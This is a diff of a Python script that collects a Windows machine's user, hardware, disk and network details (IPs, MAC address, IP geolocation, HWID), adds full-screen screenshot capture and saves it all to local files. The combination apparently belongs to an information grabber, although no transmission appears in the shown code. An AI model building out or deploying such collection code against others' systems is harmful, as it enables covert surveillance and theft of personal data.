@@ -6,6 +6,7 @@ import requests
 import win32api
 import wmi
 import socket
+from PIL import ImageGrab
 
 
 def user():
@@ -23,7 +24,7 @@ def system():
         hwid = "Unknown"
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
-    ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
+    ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize#round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
     ram = round(float(ram) / 1048576)
     
     return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nHWID: {hwid}"
@@ -56,7 +57,19 @@ def network():
     mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
     country, region, city, zip_code, isp = location(public_ip)
     
-    return f"\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\nMAC: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
+    return f"\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
 
+def screenshot():
+    try:
+        img = ImageGrab.grab(all_screens=True)
+        img.save("screenshot.png")
+    except:
+        pass
 
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
+def save():
+    with open("system.txt", "w",encoding="utf-8") as f:
+        f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
+    screenshot()
+        
+#save()
